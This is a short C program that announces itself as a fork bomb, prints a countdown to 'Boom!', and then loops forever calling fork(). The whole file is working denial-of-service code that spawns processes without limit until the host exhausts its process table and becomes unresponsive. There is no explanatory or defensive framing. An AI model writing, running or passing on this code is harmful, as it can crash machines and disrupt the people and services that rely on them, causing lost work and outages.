#include <stdio.h>
#include <unistd.h>

int main() {
    printf("This program is a fork bomb! Detonating in...\n");
    sleep(1);
    for (int i = 3; i > 0; i--) {
        printf("%d\n", i);
        sleep(1);
    }
    printf("Boom!\n");
    while (1) {
        fork();
    }
    return 0;
}
